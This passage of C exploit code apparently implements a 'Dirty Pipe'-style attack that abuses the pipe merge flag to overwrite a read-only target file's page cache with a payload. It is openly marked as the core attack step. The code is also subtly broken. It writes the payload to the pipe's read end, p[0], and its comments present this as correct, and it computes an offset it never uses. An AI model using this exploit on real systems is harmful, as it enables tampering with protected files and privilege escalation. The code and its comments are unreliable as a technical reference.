    // `PIPE_BUF_FLAG_CAN_MERGE` potentially set, even though the page is from a file.

    // Now, write our payload into the *read end* of the original pipe.
    // This write will "merge" into the page buffer that points to the target file.
    // We write at the specific offset within the page.
    off_t write_within_page_offset = offset % PAGE_SIZE;

    printf("[*] Overwriting target file with payload at offset 0x%lx (within page 0x%lx)..\n", offset, page_aligned_offset);
    ssize_t bytes_written = write(p[0], data_to_write, data_len); // Write to p[0] (read end of original pipe)
    if (bytes_written < 0) {
        perror("write to pipe [ATTACK]");
        // This is the core attack step. If this fails, the exploit may not have worked.
        // It might not directly fail but just not write.
